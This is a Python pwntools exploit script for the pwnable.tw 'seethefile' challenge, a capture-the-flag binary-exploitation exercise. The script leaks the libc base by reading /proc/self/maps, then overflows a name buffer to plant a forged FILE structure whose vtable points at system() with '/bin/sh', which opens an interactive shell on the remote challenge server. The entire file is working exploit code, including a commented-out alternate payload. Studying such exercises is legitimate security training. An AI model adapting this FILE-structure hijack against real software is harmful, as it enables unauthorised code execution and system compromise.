from pwn import *
from FILE import *
from binascii import hexlify
context.arch = 'i386'
elf = ELF('seethefile')
libc = ELF('libc_32.so.6')
io = remote('chall.pwnable.tw',10200)
#io = process('./seethefile',env={"LD_PRELOAD":"libc_32.so.6"})

def openfile(File):
    io.sendlineafter("Your choice :", "1")
    io.sendlineafter("see :", File)

def read():
    io.sendlineafter("Your choice :", "2")

def write():
    io.sendlineafter("Your choice :", "3")

def close():
    io.sendlineafter("Your choice :", "4")

def iexit(name):
    io.sendlineafter(" :", "5")
    io.sendlineafter(" :", name)

openfile('/proc/self/maps')
read()
sleep(1)
write()
io.recvuntil('[heap]\n')
libc_base = int(io.recv(8),16)+0x1000
info('LIBC BASE -> %#x'%libc_base)
close()
'''
payload = '\x00'*0x20
payload += p32(elf.sym['fp']+0x4)
ff = '/bin/sh\x00'
ff += p32(0)*11
ff += p32(elf.bss()+0x20)
ff += p32(3)
ff += p32(0)*3
ff += p32(elf.bss()+0x20)
ff += p32(0xffffffff)*2
ff += p32(0)
ff += p32(elf.bss()+0x20)
ff += p32(0)*14
payload += ff
payload += p32(elf.sym['fp']+0x4+0x98)
payload += p32(0)*2
payload += p32(libc.sym['system']+libc_base)*19
'''
payload = 0x20 * "\x00"
payload += p32(elf.sym['fp']+0x4)
payload += "/bin/sh\x00" 
payload += p32(0)*11 + p32(0x804b260) + p32(3) + p32(0)*3 + p32(0x804b260) + p32(0xffffffff)*2 + p32(0) + p32(0x804b260) + p32(0)*14 + p32(0x804B31C)
payload += p32(libc.sym['system'] + libc_base)*21

iexit(payload)

io.interactive()

